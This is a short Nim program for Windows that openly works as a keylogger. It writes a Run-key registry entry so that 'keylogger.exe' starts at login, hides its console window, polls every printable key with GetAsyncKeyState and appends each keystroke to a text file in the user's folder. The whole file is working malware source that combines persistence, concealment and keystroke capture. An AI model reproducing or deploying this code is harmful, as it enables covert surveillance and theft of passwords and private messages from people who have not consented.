import winim
import os
import registry


const path = r"Software\Microsoft\Windows\CurrentVersion\Run"
const key = "keyloggerStartup"
const value = "C:\\Users\\IEUser\\Desktop\\keylogger.exe"


setUnicodeValue(path, key, value, registry.HKEY_CURRENT_USER)

var a = 1

var shoWindow = ShowWindow(
  GetConsoleWindow(),
  SW_HIDE
  )

var f:File

while a == 1:
  for n in 32..127:
    var keyState = GetAsyncKeyState(cast[int32](n))
    if cast[int](keyState) == -32767:
      echo char(n)
      var charToWrite = char(n)
      f = open("C:\\Users\\IEUser\\out.txt",fmAppend)
      f.write($charToWrite)
      f.close()
